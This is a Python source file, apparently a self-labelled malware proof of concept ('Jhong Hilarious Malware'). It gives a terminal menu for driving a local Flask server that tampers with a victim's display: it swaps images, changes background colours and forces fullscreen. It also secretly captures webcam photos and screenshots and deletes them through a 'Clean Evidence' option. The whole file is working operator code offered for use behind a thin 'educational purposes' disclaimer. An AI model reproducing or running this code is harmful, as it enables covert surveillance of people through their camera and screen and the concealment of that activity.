import requests
from termcolor import colored
import mss
import os
import cv2

FLASK_URL = "http://localhost:5002/screenshot" 

def send(flag, action):
    url = f"http://localhost:5002/set/{flag}/{action}"
    try:
        response = requests.get(url)
        data = response.json()
        print(colored(f"[+] {data.get('message', 'Done')}", "green" if action == "on" else "yellow"))
    except Exception as e:
        print(colored(f"[-] Error: {e}", "red"))


STATIC_DIR = "static"

def clear_static_folder():
    for filename in os.listdir(STATIC_DIR):
        file_path = os.path.join(STATIC_DIR, filename)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f"[+] Deleted file: {file_path}")
            elif os.path.isdir(file_path):
                print(f"[-] Skipped folder: {file_path}")
        except Exception as e:
            print(f"[-] Error deleting {file_path}: {e}")


OUTPUT_PATH = os.path.join("static", "camera.png")

def take_picture():
    os.makedirs("static", exist_ok=True)

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[-] Cannot access the camera.")
        return

    ret, frame = cap.read()
    cap.release()

    if ret:
        cv2.imwrite(OUTPUT_PATH, frame)
        print(f"[+] Camera image saved as {OUTPUT_PATH}")
        print(f"[+] View it at: http://localhost:5002/camera")
    else:
        print("[-] Failed to capture image.")

def take_screenshot():
    SCREENSHOT_DIR = "static"
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    try:
        filename = f"screenshot.png"
        output_path = os.path.join(SCREENSHOT_DIR, filename)

        # Take screenshot
        with mss.mss() as sct:
            sct.shot(output=output_path)

        print(f"[+] Screenshot saved at: {output_path}")
        print(colored(f"[+] View at: http://localhost:5002/screenshot", "green"))
    
    except Exception as e:
        
        print(colored(f"[-] Error creating directory: {e}", "red"))
        
   
def menu():
    while True:
        
        print(colored("\n--- Terminal Control Panel ---", "cyan"))
        print(colored("1", "green") + ". Toggle image replacement (ON)")
        print(colored("2", "yellow") + ". Toggle image replacement (OFF)")
        print(colored("3", "green") + ". Toggle background color (ON)")
        print(colored("4", "yellow") + ". Toggle background color (OFF)")
        print(colored("5", "green") + ". Toggle BOTH (ON)")
        print(colored("6", "yellow") + ". Toggle BOTH (OFF)")
        print(colored("7", "magenta") + ". Reset all")
        print(colored("8", "yellow") + ". Toggle Fullscreen (ON)")
        print(colored("9", "magenta") + ". Toggle Fullscreen (OFF)")
        print(colored("10", "magenta") + ". Take screenshot")
        print(colored("11", "magenta") + ". Take picture")
        print(colored("12", "magenta") + ". Clean Evidence")
        print(colored("13", "red") + ". Exit")

        choice = input(colored("Enter your choice: ", "blue"))

        match choice:
            case "1":
                send("img", "on")
            case "2":
                send("img", "off")
            case "3":
                send("bg", "on")
            case "4":
                send("bg", "off")
            case "5":
                send("all", "on")
            case "6":
                send("all", "off")
            case "7":
                requests.get("http://localhost:5002/reset")
                print(colored("[*] State reset.", "magenta"))
            case "8":
                send("full", "on")
            case "9":
                send("full", "off")   
            case "10":
                print(colored("[*] Taking screenshot ...", "yellow"))
                take_screenshot()

            case "11":
                print(colored("[*] Taking picture ...", "yellow"))
                take_picture()

            case "12":
                print(colored("[*] Cleaning evidence ...", "yellow"))
                clear_static_folder()
                print(colored("[+] Evidence cleaned.", "green"))
            case "13":
                print(colored("[*] Exiting...", "red"))
                splash()
            case _:
                print(colored("[!] Invalid choice. Try again.", "red"))

def banner():
     print(r'''
    
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠶⠶⠶⠶⠤⢤⣀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠤⠶⠶⠦⠤⣄⡈⠙⠲⣄⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠈⢳⡀⠀
            ⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠉⠑⠦⡀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠹⡄
            ⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⣠⡀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢳⣀⡇
            ⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠈⠀⠀⠀⠀⠀⣷⠖⠋⠉⠑⠒⠦⣄⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⢠⢧⡀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀
            ⠀⠀⣀⡤⠤⢤⣘⢦⡙⠢⠤⢤⡤⠴⠋⡇⠀⠀⠀⠐⠶⠀⠀⠀⢸⠀⠀
            ⠀⡼⢁⣴⣶⣶⣌⠑⠉⠑⢠⠞⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢀⡼⠀⠀
            ⢸⠁⣿⣿⣿⣿⣷⠷⣄⠀⣏⣀⡴⠊⠀⠀⠙⠦⢄⣀⣀⣀⡤⠚⠁⠀⠀
            ⠸⡄⣿⣿⣿⣿⣿⣿⡏⢳⣄⣀⠀⠀⠀⠀⠑⢦⣀⣀⣀⡄⠀⠀⠀⠀⠀   Jhong Hilarious
            ⠀⢳⡸⡿⣿⣿⣿⣿⣿⣿⣤⣿⣩⣿⣩⣷⣶⣤⡀⠀⡄⠀⠀⠀⠀⠀⠀   POC : Jonathan
            ⠀⠀⠱⣝⢿⢻⣿⣿⣿⣿⣿⣿⠻⠿⢿⣿⣿⣿⣿⣦⠹⡄⠀⠀⠀⠀⠀
            ⠀⠀⠀⠈⠓⠙⢦⣿⠛⣿⣿⣿⣷⣦⠀⠙⣿⣿⣿⣿⡇⡇⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠈⠑⠯⣼⡿⠛⡿⣇⠀⢹⣿⣿⡿⣰⠃⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⢛⣒⢛⣋⡩⠞⠁⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ''')
     return True

def splash():
    print(colored(r''' 
        
         )               (
        / \  .-"""""-.  / \
       (   \/ __   __ \/   )
        )  ; / _\ /_ \ ;  (
       (   |  / \ / \  |   )
        \ (,  \0/_\0/  ,) /
         \_|   /   \   |_/
           | (_\___/_) |        Jhong Hilarious Malware
           .\ \ -.- / /.       P    OC by Jonathan
          {  \ `===' /  }
         {    `.___.'    }
      jgs {             }
           `"="="="="="`
    ''', "red"))
    print(colored(''' 

        [+] Menu Options
                            
        Only use this tool for educational purposes.

        [1] Open Menu
        [2] Open banner
        [3] Exit
''', "white"))
    choices = input(colored("> ", "green"))
    

    if choices == "1":
        menu()
    elif choices == "2":
        banner()
    elif choices == "3":
        print(colored("[*] Exiting...", "red"))
        exit(0)    


if __name__ == "__main__":
    splash()
   



